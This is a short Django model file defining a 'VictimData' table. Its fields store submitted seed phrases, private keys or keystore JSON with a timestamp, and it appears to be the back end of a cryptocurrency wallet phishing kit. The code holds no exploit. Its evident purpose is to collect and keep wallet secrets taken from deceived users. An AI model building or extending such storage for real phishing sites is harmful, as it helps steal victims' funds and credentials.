from django.db import models

class VictimData(models.Model):
    data_type = models.CharField(max_length=50)  # Seed Phrase, Private Key, or Keystore JSON
    data_content = models.TextField()
    submitted_at = models.DateTimeField(auto_now_add=True)